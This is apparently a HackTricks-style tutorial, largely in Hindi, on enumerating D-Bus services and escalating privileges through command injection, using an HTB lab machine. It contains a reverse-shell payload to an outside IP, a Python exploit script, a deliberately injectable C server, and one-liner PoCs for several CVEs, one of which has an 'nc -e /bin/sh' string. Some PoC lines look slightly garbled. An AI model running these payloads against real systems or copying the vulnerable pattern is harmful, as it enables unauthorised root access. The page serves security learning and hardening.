# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus का उपयोग Ubuntu डेस्कटॉप वातावरण में इंटर-प्रोसेस संचार (IPC) मध्यस्थ के रूप में किया जाता है। Ubuntu पर, कई संदेश बसों का समवर्ती संचालन देखा जाता है: सिस्टम बस, जिसे मुख्य रूप से **privileged services को सिस्टम के पार प्रासंगिक सेवाओं को उजागर करने के लिए** उपयोग किया जाता है, और प्रत्येक लॉगिन किए गए उपयोगकर्ता के लिए एक सत्र बस, जो केवल उस विशेष उपयोगकर्ता के लिए प्रासंगिक सेवाओं को उजागर करता है। यहाँ ध्यान मुख्य रूप से सिस्टम बस पर है क्योंकि यह उच्च विशेषाधिकार (जैसे, root) पर चलने वाली सेवाओं से संबंधित है क्योंकि हमारा उद्देश्य विशेषाधिकार बढ़ाना है। यह noted किया गया है कि D-Bus की आर्किटेक्चर प्रत्येक सत्र बस के लिए एक 'राउटर' का उपयोग करती है, जो क्लाइंट संदेशों को उन सेवाओं की ओर पुनर्निर्देशित करने के लिए जिम्मेदार है जो क्लाइंट द्वारा उस सेवा के लिए निर्दिष्ट पते के आधार पर संचारित करना चाहते हैं।

D-Bus पर सेवाएँ उन **objects** और **interfaces** द्वारा परिभाषित की जाती हैं जो वे उजागर करती हैं। Objects को मानक OOP भाषाओं में वर्ग उदाहरणों के समान माना जा सकता है, प्रत्येक उदाहरण को एक **object path** द्वारा अद्वितीय रूप से पहचाना जाता है। यह पथ, फाइल सिस्टम पथ के समान, सेवा द्वारा उजागर किए गए प्रत्येक object को अद्वितीय रूप से पहचानता है। अनुसंधान उद्देश्यों के लिए एक प्रमुख इंटरफेस है **org.freedesktop.DBus.Introspectable** इंटरफेस, जिसमें एकल विधि, Introspect है। यह विधि object के समर्थित विधियों, संकेतों, और गुणों का XML प्रतिनिधित्व लौटाती है, यहाँ विधियों पर ध्यान केंद्रित किया गया है जबकि गुणों और संकेतों को छोड़ दिया गया है।

D-Bus इंटरफेस के साथ संचार के लिए, दो उपकरणों का उपयोग किया गया: एक CLI उपकरण जिसका नाम **gdbus** है जो D-Bus द्वारा स्क्रिप्ट में उजागर की गई विधियों को आसानी से लागू करने के लिए है, और [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), एक Python-आधारित GUI उपकरण जो प्रत्येक बस पर उपलब्ध सेवाओं को सूचीबद्ध करने और प्रत्येक सेवा में निहित objects को प्रदर्शित करने के लिए डिज़ाइन किया गया है।
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

पहली छवि में D-Bus सिस्टम बस के साथ पंजीकृत सेवाओं को दिखाया गया है, जिसमें **org.debin.apt** विशेष रूप से सिस्टम बस बटन का चयन करने के बाद हाइलाइट किया गया है। D-Feet इस सेवा के लिए वस्तुओं का प्रश्न करता है, चयनित वस्तुओं के लिए इंटरफेस, विधियों, गुणों और संकेतों को प्रदर्शित करता है, जो दूसरी छवि में देखा जा सकता है। प्रत्येक विधि के हस्ताक्षर का भी विवरण दिया गया है।

एक महत्वपूर्ण विशेषता सेवा के **प्रक्रिया आईडी (pid)** और **कमांड लाइन** का प्रदर्शन है, जो यह पुष्टि करने के लिए उपयोगी है कि क्या सेवा उच्च विशेषाधिकारों के साथ चल रही है, जो अनुसंधान प्रासंगिकता के लिए महत्वपूर्ण है।

**D-Feet विधि आह्वान की अनुमति भी देता है**: उपयोगकर्ता पैरामीटर के रूप में Python अभिव्यक्तियाँ इनपुट कर सकते हैं, जिन्हें D-Feet सेवा को पास करने से पहले D-Bus प्रकारों में परिवर्तित करता है।

हालांकि, ध्यान दें कि **कुछ विधियों के लिए प्रमाणीकरण की आवश्यकता होती है** इससे पहले कि हमें उन्हें आह्वान करने की अनुमति दी जाए। हम इन विधियों को नजरअंदाज करेंगे, क्योंकि हमारा लक्ष्य पहले स्थान पर बिना क्रेडेंशियल्स के अपने विशेषाधिकारों को बढ़ाना है।

यह भी ध्यान दें कि कुछ सेवाएँ एक अन्य D-Bus सेवा का प्रश्न करती हैं जिसका नाम org.freedeskto.PolicyKit1 है, यह निर्धारित करने के लिए कि क्या किसी उपयोगकर्ता को कुछ क्रियाएँ करने की अनुमति दी जानी चाहिए या नहीं।

## **Cmd line Enumeration**

### सेवा वस्तुओं की सूची

खुले D-Bus इंटरफेस को सूचीबद्ध करना संभव है:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) जब एक प्रक्रिया एक बस से कनेक्शन स्थापित करती है, तो बस उस कनेक्शन को एक विशेष बस नाम सौंपती है जिसे _विशिष्ट कनेक्शन नाम_ कहा जाता है। इस प्रकार के बस नाम अपरिवर्तनीय होते हैं—यह सुनिश्चित किया गया है कि जब तक कनेक्शन मौजूद है, वे नहीं बदलेंगे—और, अधिक महत्वपूर्ण, इन्हें बस के जीवनकाल के दौरान पुन: उपयोग नहीं किया जा सकता। इसका मतलब है कि उस बस के लिए कोई अन्य कनेक्शन कभी भी ऐसा विशिष्ट कनेक्शन नाम नहीं प्राप्त करेगा, भले ही वही प्रक्रिया बस के कनेक्शन को बंद कर दे और एक नया बनाए। विशिष्ट कनेक्शन नाम आसानी से पहचाने जा सकते हैं क्योंकि वे—अन्यथा निषिद्ध—कोलन वर्ण से शुरू होते हैं।

### Service Object Info

फिर, आप इंटरफेस के बारे में कुछ जानकारी प्राप्त कर सकते हैं:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### List Interfaces of a Service Object

आपके पास पर्याप्त अनुमतियाँ होनी चाहिए।
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface of a Service Object

ध्यान दें कि इस उदाहरण में `tree` पैरामीटर का उपयोग करके खोजी गई नवीनतम इंटरफ़ेस का चयन किया गया है (_पिछले अनुभाग को देखें_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
ध्यान दें कि इंटरफेस `htb.oouch.Block` का तरीका `.Block` (जिसमें हम रुचि रखते हैं) है। अन्य कॉलम का "s" यह दर्शा सकता है कि यह एक स्ट्रिंग की अपेक्षा कर रहा है।

### मॉनिटर/कैप्चर इंटरफेस

पर्याप्त विशेषाधिकारों के साथ (केवल `send_destination` और `receive_sender` विशेषाधिकार पर्याप्त नहीं हैं) आप **D-Bus संचार** को **मॉनिटर** कर सकते हैं।

**संचार** को **मॉनिटर** करने के लिए आपको **रूट** होना आवश्यक है। यदि आप रूट होने में अभी भी समस्याएँ पा रहे हैं तो [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) और [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) की जांच करें।

> [!WARNING]
> यदि आप जानते हैं कि D-Bus कॉन्फ़िग फ़ाइल को **गैर-रूट उपयोगकर्ताओं को संचार को स्निफ़ करने की अनुमति देने** के लिए कैसे कॉन्फ़िगर करना है, तो कृपया **मुझसे संपर्क करें**!

मॉनिटर करने के विभिन्न तरीके:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
इस उदाहरण में इंटरफेस `htb.oouch.Block` की निगरानी की जाती है और **संदेश "**_**lalalalal**_**" गलत संचार के माध्यम से भेजा जाता है**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
आप `capture` का उपयोग `monitor` के बजाय कर सकते हैं ताकि परिणामों को pcap फ़ाइल में सहेजा जा सके।

#### सभी शोर को फ़िल्टर करना <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

यदि बस पर बहुत अधिक जानकारी है, तो इस तरह एक मैच नियम पास करें:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
कई नियम निर्दिष्ट किए जा सकते हैं। यदि कोई संदेश _किसी भी_ नियम से मेल खाता है, तो संदेश प्रिंट किया जाएगा। इस तरह:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
[D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) पर मैच नियम सिंटैक्स के बारे में अधिक जानकारी के लिए देखें।

### अधिक

`busctl` में और भी विकल्प हैं, [**सभी विकल्प यहाँ खोजें**](https://www.freedesktop.org/software/systemd/man/busctl.html)।

## **संवेदनशील परिदृश्य**

उपयोगकर्ता **qtc जो होस्ट "oouch" से HTB में है** के रूप में आप एक **अप्रत्याशित D-Bus कॉन्फ़िग फ़ाइल** पाएंगे जो _/etc/dbus-1/system.d/htb.oouch.Block.conf_ में स्थित है:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
पिछली कॉन्फ़िगरेशन से नोट करें कि **आपको इस D-BUS संचार के माध्यम से जानकारी भेजने और प्राप्त करने के लिए `root` या `www-data` उपयोगकर्ता होना आवश्यक है**।

डॉकर कंटेनर **aeb4525789d8** के अंदर उपयोगकर्ता **qtc** के रूप में, आप फ़ाइल _/code/oouch/routes.py_ में कुछ dbus से संबंधित कोड पा सकते हैं। यह दिलचस्प कोड है:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
जैसा कि आप देख सकते हैं, यह **D-Bus इंटरफेस से कनेक्ट हो रहा है** और **"Block" फ़ंक्शन** को "client_ip" भेज रहा है।

D-Bus कनेक्शन के दूसरी ओर कुछ C संकलित बाइनरी चल रही है। यह कोड **D-Bus कनेक्शन में IP पते के लिए सुन रहा है और `system` फ़ंक्शन के माध्यम से iptables को कॉल कर रहा है** ताकि दिए गए IP पते को ब्लॉक किया जा सके।\
**`system` को कॉल करना जानबूझकर कमांड इंजेक्शन के लिए संवेदनशील है**, इसलिए निम्नलिखित जैसे एक पेलोड एक रिवर्स शेल बनाएगा: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### इसका लाभ उठाएं

इस पृष्ठ के अंत में आप **D-Bus एप्लिकेशन का पूरा C कोड** पा सकते हैं। इसके अंदर आप पंक्तियों 91-97 के बीच **कैसे `D-Bus ऑब्जेक्ट पथ`** **और `इंटरफेस नाम`** **पंजीकृत** हैं, यह देख सकते हैं। यह जानकारी D-Bus कनेक्शन में जानकारी भेजने के लिए आवश्यक होगी:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
इसके अलावा, लाइन 57 में आप देख सकते हैं कि **इस D-Bus संचार के लिए पंजीकृत एकमात्र विधि** को `Block` कहा जाता है (_**इसलिए अगले अनुभाग में पेलोड को सेवा वस्तु `htb.oouch.Block`, इंटरफेस `/htb/oouch/Block` और विधि नाम `Block` पर भेजा जाएगा**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

निम्नलिखित पायथन कोड `block_iface.Block(runme)` के माध्यम से `Block` विधि के लिए D-Bus कनेक्शन पर पेलोड भेजेगा (_ध्यान दें कि इसे पिछले कोड के भाग से निकाला गया था_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl और dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` एक उपकरण है जिसका उपयोग "Message Bus" को संदेश भेजने के लिए किया जाता है।
- Message Bus – एक सॉफ़्टवेयर है जिसका उपयोग सिस्टम द्वारा अनुप्रयोगों के बीच संचार को आसान बनाने के लिए किया जाता है। यह Message Queue से संबंधित है (संदेश क्रम में व्यवस्थित होते हैं) लेकिन Message Bus में संदेश एक सदस्यता मॉडल में भेजे जाते हैं और यह बहुत तेज़ भी होते हैं।
- “-system” टैग का उपयोग यह बताने के लिए किया जाता है कि यह एक सिस्टम संदेश है, न कि एक सत्र संदेश (डिफ़ॉल्ट रूप से)।
- “–print-reply” टैग का उपयोग हमारे संदेश को उचित रूप से प्रिंट करने और किसी भी उत्तर को मानव-पठनीय प्रारूप में प्राप्त करने के लिए किया जाता है।
- “–dest=Dbus-Interface-Block” Dbus इंटरफ़ेस का पता है।
- “–string:” – संदेश का प्रकार जिसे हम इंटरफ़ेस को भेजना चाहते हैं। संदेश भेजने के कई प्रारूप हैं जैसे डबल, बाइट्स, बूलियन, int, objpath। इनमें से, "object path" तब उपयोगी होता है जब हम Dbus इंटरफ़ेस को फ़ाइल का पथ भेजना चाहते हैं। इस मामले में, हम एक विशेष फ़ाइल (FIFO) का उपयोग कर सकते हैं ताकि फ़ाइल के नाम पर इंटरफ़ेस को एक कमांड पास किया जा सके। “string:;” – यह फिर से object path को कॉल करने के लिए है जहाँ हम FIFO रिवर्स शेल फ़ाइल/कमांड रखते हैं।

_ध्यान दें कि `htb.oouch.Block.Block` में, पहला भाग (`htb.oouch.Block`) सेवा वस्तु को संदर्भित करता है और अंतिम भाग (`.Block`) विधि नाम को संदर्भित करता है।_

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

D-Bus हमले की बड़ी सतह का मैन्युअल रूप से `busctl`/`gdbus` के साथ एन्यूमरेशन करना जल्दी ही दर्दनाक हो जाता है। पिछले कुछ वर्षों में जारी किए गए दो छोटे FOSS उपयोगिताएँ रेड-टीम या CTF एंगेजमेंट के दौरान चीजों को तेज कर सकती हैं:

### dbusmap ("Nmap for D-Bus")
* लेखक: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* C में लिखा गया; एकल स्थिर बाइनरी (<50 kB) जो हर ऑब्जेक्ट पथ पर चलती है, `Introspect` XML खींचती है और इसे मालिक PID/UID से मैप करती है।
* उपयोगी फ्लैग्स:
```bash
# *system* बस पर हर सेवा की सूची बनाएं और सभी कॉल करने योग्य विधियों को डंप करें
sudo dbus-map --dump-methods

# उन विधियों/गुणों की सक्रिय रूप से जांच करें जिन तक आप बिना Polkit प्रॉम्प्ट के पहुंच सकते हैं
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* यह उपकरण बिना सुरक्षा के प्रसिद्ध नामों को `!` के साथ चिह्नित करता है, तुरंत उन सेवाओं को प्रकट करता है जिन्हें आप *own* (कब्जा करना) या उन विधि कॉल्स को जो एक अप्रिविलेज्ड शेल से पहुंच योग्य हैं।

### uptux.py
* लेखक: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* केवल Python स्क्रिप्ट जो systemd यूनिट्स में *लिखने योग्य* पथों **और** अत्यधिक अनुमति वाले D-Bus नीति फ़ाइलों (जैसे `send_destination="*"` ) की तलाश करती है।
* त्वरित उपयोग:
```bash
python3 uptux.py -n          # सभी जांचें चलाएं लेकिन लॉग फ़ाइल न लिखें
python3 uptux.py -d          # विस्तृत डिबग आउटपुट सक्षम करें
```
* D-Bus मॉड्यूल नीचे दिए गए निर्देशिकाओं की खोज करता है और किसी भी सेवा को उजागर करता है जिसे एक सामान्य उपयोगकर्ता द्वारा धोखा दिया या हाईजैक किया जा सकता है:
* `/etc/dbus-1/system.d/` और `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (विक्रेता ओवरराइड)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

हाल ही में प्रकाशित CVEs पर नज़र रखना कस्टम कोड में समान असुरक्षित पैटर्न को पहचानने में मदद करता है। निम्नलिखित उच्च-प्रभाव वाले स्थानीय EoP मुद्दे सभी **system bus** पर प्रमाणीकरण/अधिकार की कमी से उत्पन्न होते हैं:

| वर्ष | CVE | घटक | मूल कारण | One-Liner PoC |
|------|-----|-----------|------------|---------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (Logitech HID डेमॉन) | `logid` सिस्टम सेवा एक अनियंत्रित `org.freedesktop.Logiopsd` इंटरफेस को उजागर करती है जो *किसी भी* उपयोगकर्ता को डिवाइस प्रोफाइल बदलने और मैक्रो स्ट्रिंग्स के माध्यम से मनमाने शेल कमांड इंजेक्ट करने की अनुमति देती है। | `gdbus call -y -d org.freedesktop.Logiopsd -o /org/freedesktop/Logiopsd -m org.freedesktop.Logiopsd.LoadConfig "/tmp/pwn.yml"` |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.18 | एक रूट-चलने वाला प्रॉक्सी पुराने बस नामों को बैकएंड सेवाओं की ओर अग्रेषित करता है **बिना कॉलर UID/Polkit संदर्भ को अग्रेषित किए**, इसलिए हर अग्रेषित अनुरोध UID 0 के रूप में माना जाता है। | `gdbus call -y -d com.deepin.daemon.Grub2 -o /com/deepin/daemon/Grub2 -m com.deepin.daemon.Grub2.SetTimeout 1` |
| 2025 | CVE-2025-3931 | Red Hat Insights `yggdrasil` ≤ 0.4.6 | सार्वजनिक `Dispatch` विधि में कोई ACLs नहीं हैं → हमलावर *पैकेज-मैनेजर* कार्यकर्ता को मनमाने RPMs स्थापित करने का आदेश दे सकता है। | `dbus-send --system --dest=com.redhat.yggdrasil /com/redhat/Dispatch com.redhat.yggdrasil.Dispatch string:'{"worker":"pkg","action":"install","pkg":"nc -e /bin/sh"}'` |

ध्यान देने योग्य पैटर्न:
1. सेवा **system bus पर रूट के रूप में चलती है**।
2. कोई PolicyKit जांच नहीं (या इसे एक प्रॉक्सी द्वारा बायपास किया गया है)।
3. विधि अंततः `system()`/पैकेज स्थापना/डिवाइस पुनः कॉन्फ़िगरेशन की ओर ले जाती है → कोड निष्पादन।

`dbusmap --enable-probes` या मैनुअल `busctl call` का उपयोग करें यह पुष्टि करने के लिए कि क्या एक पैच उचित `polkit_authority_check_authorization()` लॉजिक को बैक-पोर्ट करता है।

---

## Hardening & Detection Quick-Wins

* विश्व-लिखने योग्य या *send/receive*-खुले नीतियों की खोज करें:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* खतरनाक विधियों के लिए Polkit की आवश्यकता – यहां तक कि *root* प्रॉक्सी को `polkit_authority_check_authorization_sync()` को अपने स्वयं के PID के बजाय *caller* PID को पास करना चाहिए।
* लंबे समय तक चलने वाले सहायक में विशेषाधिकार छोड़ें (बस से कनेक्ट करने के बाद namespaces को स्विच करने के लिए `sd_pid_get_owner_uid()` का उपयोग करें)।
* यदि आप एक सेवा को हटा नहीं सकते हैं, तो कम से कम इसे एक समर्पित Unix समूह तक *scope* करें और इसकी XML नीति में पहुंच को प्रतिबंधित करें।
* ब्लू-टीम: `busctl capture --output=/var/log/dbus_$(date +%F).pcap` के साथ सिस्टम बस की स्थायी कैप्चर सक्षम करें और विसंगति पहचान के लिए Wireshark में आयात करें।

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)


- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{{#include ../../banners/hacktricks-training.md}}
